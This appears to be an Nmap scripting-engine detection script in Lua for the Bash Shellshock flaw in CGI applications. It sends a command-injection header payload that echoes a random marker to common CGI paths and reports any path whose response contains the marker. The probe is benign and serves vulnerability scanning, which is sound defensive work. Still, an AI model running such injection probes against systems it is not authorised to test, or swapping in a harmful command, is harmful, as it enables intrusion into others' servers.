-- Shellshock Vulnerability Detection (CVE-2014-6271)
-- Tests for Bash Shellshock vulnerability in CGI applications
-- @output
-- 80/tcp open  http
-- | http-shellshock:
-- |   VULNERABLE:
-- |   HTTP Shellshock vulnerability
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  CVE:CVE-2014-6271  CVE:CVE-2014-7169
-- |     Risk factor: HIGH  CVSSv2: 10.0 (HIGH) (AV:N/AC:L/Au:N/C:C/I:C/A:C)
-- |       This web application appears vulnerable to the Shellshock vulnerability,
-- |       a critical remote code execution flaw in GNU Bash.
-- |     
-- |     Vulnerable path: /cgi-bin/status
-- |     Disclosure date: 2014-09-24
-- |     References:
-- |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
-- |_      http://seclists.org/oss-sec/2014/q3/650

description = [[
Attempts to detect the Shellshock vulnerability (CVE-2014-6271 and CVE-2014-7169)
by sending specially crafted HTTP headers to CGI scripts.

The vulnerability allows remote attackers to execute arbitrary commands through
environment variables in Bash.
]]

author = "Nemue Security Team"
license = "MIT"
categories = {"vuln", "intrusive", "exploit"}

portrule = function(host, port)
    return port.service == "http" or port.service == "https" or
           port.number == 80 or port.number == 443 or port.number == 8080
end

action = function(host, port)
    local http = require "http"
    
    -- Common CGI paths to test
    local cgi_paths = {
        "/cgi-bin/status",
        "/cgi-bin/admin.cgi",
        "/cgi-bin/test.cgi",
        "/cgi-bin/test",
        "/cgi-bin/printenv",
        "/cgi-bin/admin",
        "/cgi-sys/defaultwebpage.cgi",
        "/cgi-mod/index.cgi",
        "/cgi-bin/jarrewrite.sh",
        "/cgi-bin/",
    }
    
    -- Shellshock payload (safe detection only)
    -- Uses a unique marker to detect if command execution occurred
    local marker = "NEMUE_SHELLSHOCK_TEST_" .. math.random(10000, 99999)
    local payload = "() { :; }; echo; echo " .. marker
    
    local vulnerable_paths = {}
    
    for _, path in ipairs(cgi_paths) do
        -- Test with User-Agent header
        local options = {
            header = {
                ["User-Agent"] = payload,
                ["Referer"] = payload,
                ["Cookie"] = payload,
            },
            bypass_cache = true
        }
        
        local response = http.get(host, port, path, options)
        
        if response and response.body then
            -- Check if our marker appeared in response
            if response.body:find(marker, 1, true) then
                table.insert(vulnerable_paths, path)
            end
        end
    end
    
    -- Test with custom header
    for _, path in ipairs(cgi_paths) do
        local options = {
            header = {
                ["X-Shellshock"] = payload,
                ["Accept-Language"] = payload,
            },
            bypass_cache = true
        }
        
        local response = http.get(host, port, path, options)
        
        if response and response.body then
            if response.body:find(marker, 1, true) then
                if not contains(vulnerable_paths, path) then
                    table.insert(vulnerable_paths, path)
                end
            end
        end
    end
    
    if #vulnerable_paths > 0 then
        local result = "VULNERABLE:\n"
        result = result .. "HTTP Shellshock vulnerability\n"
        result = result .. "  State: VULNERABLE (Exploitable)\n"
        result = result .. "  IDs:  CVE:CVE-2014-6271  CVE:CVE-2014-7169\n"
        result = result .. "  Risk factor: HIGH  CVSSv2: 10.0 (HIGH) (AV:N/AC:L/Au:N/C:C/I:C/A:C)\n"
        result = result .. "    This web application appears vulnerable to the Shellshock vulnerability,\n"
        result = result .. "    a critical remote code execution flaw in GNU Bash.\n"
        result = result .. "  \n"
        result = result .. "  Vulnerable paths:\n"
        for _, path in ipairs(vulnerable_paths) do
            result = result .. "    " .. path .. "\n"
        end
        result = result .. "  Disclosure date: 2014-09-24\n"
        result = result .. "  References:\n"
        result = result .. "    https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271\n"
        result = result .. "    http://seclists.org/oss-sec/2014/q3/650"
        return result
    end
    
    return "Not vulnerable to Shellshock"
end

-- Helper function to check if table contains value
function contains(table, value)
    for _, v in ipairs(table) do
        if v == value then
            return true
        end
    end
    return false
end
